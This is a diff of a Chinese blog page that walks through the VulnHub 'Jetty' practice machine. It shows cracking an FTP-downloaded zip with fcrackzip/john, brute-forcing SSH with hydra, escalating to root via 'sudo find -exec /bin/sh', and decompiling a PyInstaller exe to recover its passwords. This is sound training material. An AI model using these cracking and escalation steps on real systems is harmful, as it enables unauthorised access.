@@ -32,7 +32,7 @@
 
 
   <title>
-VULNHUB JETTY - VULNHUB |
+VULNHUB 32 JETTY - VULNHUB |
 Phut Hon = X_T = 天行健，君子以自强不息</title>
 <meta name="generator" content="Hexo 6.3.0"></head>
 <body itemscope itemtype="http://schema.org/WebPage">
@@ -60,7 +60,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
         <div id="brand">
           <div class="pjax">
           
-  <h1 itemprop="name headline">VULNHUB JETTY
+  <h1 itemprop="name headline">VULNHUB 32 JETTY
   </h1>
   
 <div class="meta">
@@ -76,7 +76,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       <i class="ic i-pen"></i>
     </span>
     <span class="text">本文字数</span>
-    <span>2.8k</span>
+    <span>2.9k</span>
     <span class="text">字</span>
   </span>
   <span class="item" title="阅读时长">
@@ -117,12 +117,12 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/C83rXtNWOS4dPh6.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/BId2kKHmufXsrnl.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/RxL7bMZt5rslE68.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/UlDZRiq3gbE2evh.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/dwNFSq4OhisgMJn.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/iqT6cP9kuwrzyLx.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/42PBV1A3YGWyXN8.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/VHIxW2qc1oAMOef.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/DZRlqjoQg3XAKsz.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/wM1vF7Eipkbmzlg.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/NxsmFbBQptiHlCW.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/QcaNdtYUGsXgeKq.jpg"></li>
         </ul>
       </div>
     </header>
@@ -175,32 +175,45 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
  靶机 JETTY：桥接于 1 92.168.31.1 的网卡，ip 未知</p>
 <p>1 ）确定靶机 ip 地址<br>
  sudo arp-scan -l</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-829.png" alt></p>
 <p>à 靶机 ip：192.168.31. 66</p>
 <p>2 ）确认靶机 ip 开放的端口信息<br>
  sudo nmap - PA 192.168.31. 66</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-830.png" alt></p>
 <p>à 靶机开放端口 21 ， 80</p>
 <h3 id="002-ftp弱口令frackzipjohn破解zip敏感信息总结"><a class="markdownIt-Anchor" href="#002-ftp弱口令frackzipjohn破解zip敏感信息总结">#</a> 002 ftp 弱口令，frackzip/john 破解 zip，敏感信息总结</h3>
 <p>先从 ftp 进行下手，尝试弱口令登陆成功</p>
 <p>看到 ftp 服务中存在两个文件，将文件下载下来</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-831.png" alt></p>
 <p>可以用 lcd 来在 ftp 服务中控制 kali 的目录，进行下载文件</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-832.png" alt></p>
 <p>查看下载下来的两个文件，其中 README.txt 中给了 Henry、Michael 的用户名<br>
 解压 sshpass.zip 的时候发现其是有密码认证的，需要破解 zip</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-833.png" alt></p>
 <p>fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt sshpass.zip</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-834.png" alt></p>
 <p>也可以使用 zip 2 john 将加密的 zip 转化为可以用 john 破解的<br>
  zip2join sshpass.zip &gt; ssh.txt<br>
 john ssh.txt –wordlist=/usr/share/wordlists/rockyou.txt</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-835.png" alt></p>
 <p>得到 zip 的密码为 seahorse！进行解压</p>
 <p>解压后即得到了 ssh 的密码</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-836.png" alt></p>
 <p>到目前为止我们已经得到了 ssh 的一个疑似账户 Henry 和一个 ssh 密码<br>
 但是我们扫描端口时并没有发现 ssh 协议是开启的，还需要其他的信息收集</p>
 <p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEu">http://192.168.31.</span> 66 / 进行信息收集</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-837.png" alt></p>
 <h3 id="识别目录看能否找到更多的目录信息"><a class="markdownIt-Anchor" href="#识别目录看能否找到更多的目录信息">#</a> 识别目录，看能否找到更多的目录信息</h3>
+<p><img data-src="/N1h1l157/VULNHUB/image-838.png" alt></p>
 <p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuNjYvcm9ib3RzLnR4dA==">http://192.168.31.66/robots.txt</span> 发现了四个目录，依次访问之后没有发现</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-839.png" alt></p>
 <h3 id="到此为止我们的信息收集工作就做完了但是仍然还有个问题为什么没有"><a class="markdownIt-Anchor" href="#到此为止我们的信息收集工作就做完了但是仍然还有个问题为什么没有">#</a> 到此为止，我们的信息收集工作就做完了，但是仍然还有个问题，为什么没有</h3>
 <p>开启 ssh 协议，是不是之前识别的结果有问题？还有就是 ssh 用户名只有这一<br>
 个吗，还有没有其他的可能的用户名。<br>
 带着问题去看 vulnhub 上给出的提示，发现了一个用户名 Squiddie</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-840.png" alt></p>
 <p>其次，用 nmap 再次更详细的扫描一下端口，看能否扫描到 ssh 协议</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-841.png" alt></p>
 <p>经过这一次的扫描，扫描到了 65507 端口开放的是 ssh 协议<br>
 可能因为这个端口在比较靠后的位置，并且不是常用的端口，所以第一次扫描<br>
 的时候并没有扫到</p>
@@ -210,7 +223,10 @@ john ssh.txt –wordlist=/usr/share/wordlists/rockyou.txt</p>
  zip 之后解压出来的密码<br>
  hydra -L user.txt -P sshpass.txt ssh://192.168.31.66 -f -t 4 -I -s 65507 -vV -o hydra.ssh<br>
 ssh <span class="exturl" data-url="bWFpbHRvOnNxdWlkZGllQDE5Mi4xNjguMzEuNjY=">squiddie@192.168.31.66</span> -p 65507</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-843.png" alt></p>
 <p>ssh <span class="exturl" data-url="bWFpbHRvOnNxdWlkZGllQDE5Mi4xNjguMzEuNjY=">squiddie@192.168.31.66</span> - p 65507</p>
+<h1 id="我用识别工具识别的pdf居然裁剪的图片也被发现了"><a class="markdownIt-Anchor" href="#我用识别工具识别的pdf居然裁剪的图片也被发现了">#</a> ？？我用识别工具识别的 pdf，居然裁剪的图片也被发现了？？？</h1>
+<p><img data-src="/N1h1l157/VULNHUB/image-844.png" alt></p>
 <p>靶机里边装了一个 python 2 的命令，输入 python 2 打开其命令行</p>
 <blockquote>
 <blockquote>
@@ -221,29 +237,41 @@ pty.spawn(&quot;/bin/bash&quot;)<br>
 </blockquote>
 </blockquote>
 </blockquote>
+<p><img data-src="/N1h1l157/VULNHUB/image-846.png" alt></p>
 <p>sudo - l 时发现了可以无密码调用 root 的 find 命令，利用 find 提权<br>
  sudo find. -exec /bin/sh ; -quit</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-847.png" alt></p>
 <p>à 成功拿到了 root 权限</p>
 <h3 id="004-调查取证利用uncompyle6进行反编译pyc文件"><a class="markdownIt-Anchor" href="#004-调查取证利用uncompyle6进行反编译pyc文件">#</a> 004 调查取证，利用 uncompyle6 进行反编译 pyc 文件</h3>
 <h3 id="此靶机的目标是找到犯罪证据还需进一步的深入测试"><a class="markdownIt-Anchor" href="#此靶机的目标是找到犯罪证据还需进一步的深入测试">#</a> 此靶机的目标是找到犯罪证据，还需进一步的深入测试</h3>
 <p>查看定时任务 crontab -l 发现有一个备份文件一直在执行<br>
 此命令就是做一个备份，跟踪找到这个.docs 的文件夹查看内容</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-848.png" alt></p>
 <p>这里有几个 xlsx 的文件以及一个文件夹，也许这几个文件就是犯罪证据，我们<br>
 将这些文件都发送到 kali 机器上，用 scp/ftp/python 等方式进行传输<br>
  scp -r * <span class="exturl" data-url="bWFpbHRvOnBhcmFsbGVsc0AxOTIuMTY4LjMxLjY1">parallels@192.168.31.65</span>:~/Desktop/tool/jetty/doc/</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-849.png" alt></p>
 <p>Kali 机器接受到文件之后，直接双击打开这些 xlsx 的文件</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-850.png" alt></p>
 <p>错误内容显示架构不支持，因为此 kali 机器是在 mac M1 上虚拟出来的虚拟<br>
 机，是 arm 架构的 kali，所以有些东西是没有兼容的</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-851.png" alt></p>
 <p>并且 Password_kepper 文件夹中有一个 exe 的 windows 上才能执行的可执行文<br>
 件，是需要发到 windows 机器上才能运行的</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-852.png" alt></p>
 <p>这个地方我再次通过 scp 将这些文件都传输到了一般用的 amd 的 windows 机器<br>
  ping 192.168.31.91<br>
 scp -r * <span class="exturl" data-url="bWFpbHRvOmFkbWluaXN0cmF0b3JAMTkyLjE2OC4zMS45MQ==">administrator@192.168.31.91</span>:/E:/Desktop/doc/</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-853.png" alt></p>
 <h3 id="传输成功结果如下图"><a class="markdownIt-Anchor" href="#传输成功结果如下图">#</a> 传输成功，结果如下图</h3>
+<p><img data-src="/N1h1l157/VULNHUB/image-854.png" alt></p>
 <p>xlsx 文件需要密码才能解开</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-855.png" alt></p>
 <p>运行 exe 文件，发现有个选项可以查看密码</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-856.png" alt></p>
 <p>大致浏览了一下所有的信息之后，发现这个 exe 文件是用 pyinstaller 编译出来<br>
 的，既然如此，接下来我们的目标就是去反编译这个 exe 文件</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-857.png" alt></p>
 <p>下载在 github 上用于反编译 pyinstaller 生成的文件的工具 pyinstxtractor<br>
 wget <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2V4dHJlbWVjb2RlcnMtcmUvcHlpbnN0eHRyYWN0b3IuZ2l0">https://github.com/extremecoders-re/pyinstxtractor.git</span><br>
  由于是在 windows 上机器操作，wget 命令需要自己下载并配置为全局的环境变<br>
@@ -251,20 +279,28 @@ wget <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2V4dHJlbWVjb2RlcnMt
 <p>Python 2 <span class="exturl" data-url="aHR0cDovL3B5aW5zdHh0cmFjdG9yLnB5">pyinstxtractor.py</span> password_keeper.exe<br>
  执行之后会在 pyinstxtractor.py 同目录下生成一个文件夹（注意，使用 python2</p>
 <p>运行，python3 我这里会在反编译 pyc 的那一步报错）</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-858.png" alt></p>
 <p>会在同一目录下产生一个 password_keeper.exe_extracted 目录，在目录下找到关</p>
 <p>键 pyc 文件也就是 password_keeper.pyc，再将这个文件反编译。</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-859.png" alt></p>
 <p>使用 uncompyle6 反编译 pyc 文件<br>
 安装 uncompyle<br>
 pip install uncompyle</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-860.png" alt></p>
 <p>反编译 pyc 文件<br>
  uncompyle6 .\password_keeper.pyc &gt; password_keeper.py</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-861.png" alt></p>
 <h3 id="对得到的远吗进行代码审计理清功能大致如下"><a class="markdownIt-Anchor" href="#对得到的远吗进行代码审计理清功能大致如下">#</a> 对得到的远吗进行代码审计，理清功能大致如下</h3>
 <p>我们输入选项之后，需要我们输入一个密钥，将此密钥进行 base 64 加密后与代<br>
 码中的 key 进行比对，如果是相同的就会输出密码</p>
 <p>需要将 N2FlMjE4ZmYyOTI4ZjZiMg<mark> 先进行 base 64 解密<br>
  echo “N2FlMjE4ZmYyOTI4ZjZiMg</mark>” ｜ base 64 - d</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-862.png" alt><br>
+<img data-src="/N1h1l157/VULNHUB/image-863.png" alt></p>
 <p>运行 exe 文件，输入 1 ，然后输入解密后的密钥 7ae218ff2928f6b2</p>
-<p>得到了五个密码，分别是这五个 xlsx 的密码</p>
+<p><img data-src="/N1h1l157/VULNHUB/image-864.png" alt></p>
+<p>得到了五个密码，分别是这五个 xlsx 的密码<br>
+<img data-src="/N1h1l157/VULNHUB/image-865.png" alt></p>
 <p>à 成功拿到犯罪证据</p>
 
       <div class="tags">
@@ -280,9 +316,9 @@ pip install uncompyle</p>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">更新于</span>
-    <time title="修改时间：2023-07-04 23:15:08" itemprop="dateModified" datetime="2023-07-04T23:15:08+08:00">2023-07-04</time>
+    <time title="修改时间：2023-07-06 02:17:17" itemprop="dateModified" datetime="2023-07-06T02:17:17+08:00">2023-07-06</time>
   </span>
-  <span id="2021/11/01/VULNHUB/132 JETTY/" class="item leancloud_visitors" data-flag-title="VULNHUB JETTY" title="阅读次数">
+  <span id="2021/11/01/VULNHUB/132 JETTY/" class="item leancloud_visitors" data-flag-title="VULNHUB 32 JETTY" title="阅读次数">
       <span class="icon">
         <i class="ic i-eye"></i>
       </span>
@@ -324,7 +360,7 @@ pip install uncompyle</p>
   </li>
   <li class="link">
     <strong>本文链接：</strong>
-    <a href="http://n1h1l157.github.io/2021/11/01/VULNHUB/132%20JETTY/" title="VULNHUB JETTY">http://n1h1l157.github.io/2021/11/01/VULNHUB/132 JETTY/</a>
+    <a href="http://n1h1l157.github.io/2021/11/01/VULNHUB/132%20JETTY/" title="VULNHUB 32 JETTY">http://n1h1l157.github.io/2021/11/01/VULNHUB/132 JETTY/</a>
   </li>
   <li class="license">
     <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
@@ -343,20 +379,20 @@ pip install uncompyle</p>
     <div class="item left">
       
 
-  <a href="/2021/11/01/VULNHUB/138%20BLUESOMKE/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;iw5hEbpoS7DKcve.jpg" title="VULNHUB BLUESOMKE">
+  <a href="/2021/11/01/VULNHUB/126%20HACKERKID/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;gs6XxBVA1FQvmG4.jpg" title="VULNHUB 26 HACKERKID">
   <span class="type">上一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
-  <h3>VULNHUB BLUESOMKE</h3>
+  <h3>VULNHUB 26 HACKERKID</h3>
   </a>
 
     </div>
     <div class="item right">
       
 
-  <a href="/2021/11/01/VULNHUB/139%20INFERNO/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;paNiQwcqzXCExYj.jpg" title="VULNHUB INFERNO">
+  <a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;s2.loli.net&#x2F;2023&#x2F;04&#x2F;01&#x2F;69RMbK3Oref4Vqo.jpg" title="VULNHUB 34 GROTESQUE2">
   <span class="type">下一篇</span>
   <span class="category"><i class="ic i-flag"></i> VULNHUB</span>
-  <h3>VULNHUB INFERNO</h3>
+  <h3>VULNHUB 34 GROTESQUE2</h3>
   </a>
 
     </div>
@@ -375,11 +411,11 @@ pip install uncompyle</p>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="文章目录">
-          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#001-%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E7%9A%84%E8%B4%A2%E4%BA%A7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text"> 001 确认攻击目标的财产信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#002-ftp%E5%BC%B1%E5%8F%A3%E4%BB%A4frackzipjohn%E7%A0%B4%E8%A7%A3zip%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text"> 002 ftp 弱口令，frackzip&#x2F;john 破解 zip，敏感信息总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%86%E5%88%AB%E7%9B%AE%E5%BD%95%E7%9C%8B%E8%83%BD%E5%90%A6%E6%89%BE%E5%88%B0%E6%9B%B4%E5%A4%9A%E7%9A%84%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-number">3.</span> <span class="toc-text"> 识别目录，看能否找到更多的目录信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B0%E6%AD%A4%E4%B8%BA%E6%AD%A2%E6%88%91%E4%BB%AC%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E4%BD%9C%E5%B0%B1%E5%81%9A%E5%AE%8C%E4%BA%86%E4%BD%86%E6%98%AF%E4%BB%8D%E7%84%B6%E8%BF%98%E6%9C%89%E4%B8%AA%E9%97%AE%E9%A2%98%E4%B8%BA%E4%BB%80%E4%B9%88%E6%B2%A1%E6%9C%89"><span class="toc-number">4.</span> <span class="toc-text"> 到此为止，我们的信息收集工作就做完了，但是仍然还有个问题，为什么没有</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#003-hydra%E6%8C%87%E5%AE%9A%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4find%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text"> 003 hydra 指定端口爆破，find 提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#004-%E8%B0%83%E6%9F%A5%E5%8F%96%E8%AF%81%E5%88%A9%E7%94%A8uncompyle6%E8%BF%9B%E8%A1%8C%E5%8F%8D%E7%BC%96%E8%AF%91pyc%E6%96%87%E4%BB%B6"><span class="toc-number">6.</span> <span class="toc-text"> 004 调查取证，利用 uncompyle6 进行反编译 pyc 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A4%E9%9D%B6%E6%9C%BA%E7%9A%84%E7%9B%AE%E6%A0%87%E6%98%AF%E6%89%BE%E5%88%B0%E7%8A%AF%E7%BD%AA%E8%AF%81%E6%8D%AE%E8%BF%98%E9%9C%80%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">7.</span> <span class="toc-text"> 此靶机的目标是找到犯罪证据，还需进一步的深入测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E6%88%90%E5%8A%9F%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B%E5%9B%BE"><span class="toc-number">8.</span> <span class="toc-text"> 传输成功，结果如下图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BE%97%E5%88%B0%E7%9A%84%E8%BF%9C%E5%90%97%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%90%86%E6%B8%85%E5%8A%9F%E8%83%BD%E5%A4%A7%E8%87%B4%E5%A6%82%E4%B8%8B"><span class="toc-number">9.</span> <span class="toc-text"> 对得到的远吗进行代码审计，理清功能大致如下</span></a></li></ol>
+          <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#001-%E7%A1%AE%E8%AE%A4%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E7%9A%84%E8%B4%A2%E4%BA%A7%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text"> 001 确认攻击目标的财产信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#002-ftp%E5%BC%B1%E5%8F%A3%E4%BB%A4frackzipjohn%E7%A0%B4%E8%A7%A3zip%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%80%BB%E7%BB%93"><span class="toc-number">2.</span> <span class="toc-text"> 002 ftp 弱口令，frackzip&#x2F;john 破解 zip，敏感信息总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%86%E5%88%AB%E7%9B%AE%E5%BD%95%E7%9C%8B%E8%83%BD%E5%90%A6%E6%89%BE%E5%88%B0%E6%9B%B4%E5%A4%9A%E7%9A%84%E7%9B%AE%E5%BD%95%E4%BF%A1%E6%81%AF"><span class="toc-number">3.</span> <span class="toc-text"> 识别目录，看能否找到更多的目录信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%B0%E6%AD%A4%E4%B8%BA%E6%AD%A2%E6%88%91%E4%BB%AC%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E4%BD%9C%E5%B0%B1%E5%81%9A%E5%AE%8C%E4%BA%86%E4%BD%86%E6%98%AF%E4%BB%8D%E7%84%B6%E8%BF%98%E6%9C%89%E4%B8%AA%E9%97%AE%E9%A2%98%E4%B8%BA%E4%BB%80%E4%B9%88%E6%B2%A1%E6%9C%89"><span class="toc-number">4.</span> <span class="toc-text"> 到此为止，我们的信息收集工作就做完了，但是仍然还有个问题，为什么没有</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#003-hydra%E6%8C%87%E5%AE%9A%E7%AB%AF%E5%8F%A3%E7%88%86%E7%A0%B4find%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text"> 003 hydra 指定端口爆破，find 提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%88%91%E7%94%A8%E8%AF%86%E5%88%AB%E5%B7%A5%E5%85%B7%E8%AF%86%E5%88%AB%E7%9A%84pdf%E5%B1%85%E7%84%B6%E8%A3%81%E5%89%AA%E7%9A%84%E5%9B%BE%E7%89%87%E4%B9%9F%E8%A2%AB%E5%8F%91%E7%8E%B0%E4%BA%86"><span class="toc-number"></span> <span class="toc-text"> ？？我用识别工具识别的 pdf，居然裁剪的图片也被发现了？？？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#004-%E8%B0%83%E6%9F%A5%E5%8F%96%E8%AF%81%E5%88%A9%E7%94%A8uncompyle6%E8%BF%9B%E8%A1%8C%E5%8F%8D%E7%BC%96%E8%AF%91pyc%E6%96%87%E4%BB%B6"><span class="toc-number">1.</span> <span class="toc-text"> 004 调查取证，利用 uncompyle6 进行反编译 pyc 文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A4%E9%9D%B6%E6%9C%BA%E7%9A%84%E7%9B%AE%E6%A0%87%E6%98%AF%E6%89%BE%E5%88%B0%E7%8A%AF%E7%BD%AA%E8%AF%81%E6%8D%AE%E8%BF%98%E9%9C%80%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E6%B7%B1%E5%85%A5%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text"> 此靶机的目标是找到犯罪证据，还需进一步的深入测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E8%BE%93%E6%88%90%E5%8A%9F%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B%E5%9B%BE"><span class="toc-number">3.</span> <span class="toc-text"> 传输成功，结果如下图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BE%97%E5%88%B0%E7%9A%84%E8%BF%9C%E5%90%97%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%90%86%E6%B8%85%E5%8A%9F%E8%83%BD%E5%A4%A7%E8%87%B4%E5%A6%82%E4%B8%8B"><span class="toc-number">4.</span> <span class="toc-text"> 对得到的远吗进行代码审计，理清功能大致如下</span></a></li></ol>
       </div>
       <div class="related panel pjax" data-title="系列文章">
         <ul>
-          <li><a href="/2021/11/01/VULNHUB/102%20NAPPING/" rel="bookmark" title="VULNHUB 2 NAPPING">VULNHUB 2 NAPPING</a></li><li><a href="/2021/11/01/VULNHUB/103%20HACKSUDO/" rel="bookmark" title="VULNHUB 3 HACKSUDO">VULNHUB 3 HACKSUDO</a></li><li><a href="/2021/11/01/VULNHUB/106%20SYMFONOS/" rel="bookmark" title="VULNHUB 6 SYMFONOS">VULNHUB 6 SYMFONOS</a></li><li><a href="/2021/11/01/VULNHUB/104%20BREAKOUT/" rel="bookmark" title="VULNHUB 4 BREAKOUT">VULNHUB 4 BREAKOUT</a></li><li><a href="/2021/11/01/VULNHUB/101%20EVM/" rel="bookmark" title="VULNHUB 1 EVM">VULNHUB 1 EVM</a></li><li><a href="/2021/11/01/VULNHUB/107%20RECON/" rel="bookmark" title="VULNHUB 7 RECON">VULNHUB 7 RECON</a></li><li><a href="/2021/11/01/VULNHUB/110%20RED/" rel="bookmark" title="VULNHUB 10 RED">VULNHUB 10 RED</a></li><li><a href="/2021/11/01/VULNHUB/108%20MATRIX/" rel="bookmark" title="VULNHUB 8 MATRIX">VULNHUB 8 MATRIX</a></li><li><a href="/2021/11/01/VULNHUB/113%20CHRONOS/" rel="bookmark" title="VULNHUB 13 CHRONOS">VULNHUB 13 CHRONOS</a></li><li><a href="/2021/11/01/VULNHUB/115%20THALES/" rel="bookmark" title="VULNHUB 15 THALES">VULNHUB 15 THALES</a></li><li><a href="/2021/11/01/VULNHUB/109%20WALLABY/" rel="bookmark" title="VULNHUB 9 WALLABY">VULNHUB 9 WALLABY</a></li><li><a href="/2021/11/01/VULNHUB/120%20BEELZEBUB/" rel="bookmark" title="VULNHUB 20 BEELZEBUB">VULNHUB 20 BEELZEBUB</a></li><li><a href="/2021/11/01/VULNHUB/116%20LUPINONE/" rel="bookmark" title="VULNHUB 16 LUPINONE">VULNHUB 16 LUPINONE</a></li><li><a href="/2021/11/01/VULNHUB/118%20JANGOW/" rel="bookmark" title="VULNHUB 18 JANGOW">VULNHUB 18 JANGOW</a></li><li><a href="/2021/11/01/VULNHUB/117%20WEBMACHINE/" rel="bookmark" title="VULNHUB 17 WEBMACHINE">VULNHUB 17 WEBMACHINE</a></li><li><a href="/2021/11/01/VULNHUB/112%20THOTH/" rel="bookmark" title="VULNHUB 12 THOTH">VULNHUB 12 THOTH</a></li><li><a href="/2021/11/01/VULNHUB/119%20THOR/" rel="bookmark" title="VULNHUB 19 THOR">VULNHUB 19 THOR</a></li><li><a href="/2021/11/01/VULNHUB/111%20DEATHNOTE/" rel="bookmark" title="VULNHUB 11 DEATHNOTE">VULNHUB 11 DEATHNOTE</a></li><li><a href="/2021/11/01/VULNHUB/122%20FUNBOX10/" rel="bookmark" title="VULNHUB 22 FUNBOX10">VULNHUB 22 FUNBOX10</a></li><li><a href="/2021/11/01/VULNHUB/105%20EARTH/" rel="bookmark" title="VULNHUB 5 EARTH">VULNHUB 5 EARTH</a></li><li><a href="/2021/11/01/VULNHUB/121%20RIPPER/" rel="bookmark" title="VULNHUB 21 RIPPER">VULNHUB 21 RIPPER</a></li><li><a href="/2021/11/01/VULNHUB/123%20KEYRING/" rel="bookmark" title="VULNHUB 23 KEYRING">VULNHUB 23 KEYRING</a></li><li><a href="/2021/11/01/VULNHUB/125%20SNAKEOIL/" rel="bookmark" title="VULNHUB SNAKEOIL">VULNHUB SNAKEOIL</a></li><li><a href="/2021/11/01/VULNHUB/129%20PRESIDENTIAL/" rel="bookmark" title="VULNHUB PRESIDENTIAL">VULNHUB PRESIDENTIAL</a></li><li><a href="/2021/11/01/VULNHUB/126%20HACKERKID/" rel="bookmark" title="VULNHUB HACKERKID">VULNHUB HACKERKID</a></li><li><a href="/2021/11/01/VULNHUB/114%20ICA/" rel="bookmark" title="VULNHUB 14 ICA">VULNHUB 14 ICA</a></li><li><a href="/2021/11/01/VULNHUB/128%20BLUEMOON/" rel="bookmark" title="VULNHUB BLUEMOON">VULNHUB BLUEMOON</a></li><li><a href="/2021/11/01/VULNHUB/124%20HACKABLELL/" rel="bookmark" title="VULNHUB HACKABLELL">VULNHUB HACKABLELL</a></li><li><a href="/2021/11/01/VULNHUB/131%20PROXIMACENTAURI/" rel="bookmark" title="VULNHUB PROXIMACENTAURI">VULNHUB PROXIMACENTAURI</a></li><li><a href="/2021/11/01/VULNHUB/134%20GROTESQUE2/" rel="bookmark" title="VULNHUB GROTESQUE2">VULNHUB GROTESQUE2</a></li><li><a href="/2021/11/01/VULNHUB/130%20MOMENTUM2/" rel="bookmark" title="VULNHUB MOMENTUM2">VULNHUB MOMENTUM2</a></li><li><a href="/2021/11/01/VULNHUB/136%20GROTESQUE1/" rel="bookmark" title="VULNHUB GROTESQUE1">VULNHUB GROTESQUE1</a></li><li><a href="/2021/11/01/VULNHUB/137%20VENUS/" rel="bookmark" title="VULNHUB 